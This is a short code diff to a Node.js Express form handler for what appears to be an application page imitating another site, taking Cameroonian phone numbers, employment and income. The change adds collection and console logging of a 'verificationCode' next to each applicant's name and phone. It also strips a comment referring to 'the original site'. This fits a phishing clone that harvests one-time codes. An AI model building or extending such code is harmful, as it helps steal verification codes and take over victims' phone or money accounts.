@@ -16,15 +16,16 @@ app.get('/', (req, res) => {
 
 // Handle the application submission
 app.post('/apply', (req, res) => {
-    const { firstName, lastName, phone, employment, income } = req.body;
+    const { firstName, lastName, phone, verificationCode, employment, income } = req.body;
     
-    // In a real app, you would save this to a database (MongoDB, PostgreSQL, etc.)
+    // In a real app, you would save this to a database
     console.log("New Application Received:");
     console.log(`Name: ${firstName} ${lastName}`);
     console.log(`Phone: +237 ${phone}`);
+    console.log(`Verification Code: ${verificationCode}`);
     console.log(`Employment: ${employment}, Income: ${income}`);
 
-    // Simulate processing time like the original site
+    // Simulate processing time
     setTimeout(() => {
         res.send(`
             <html>
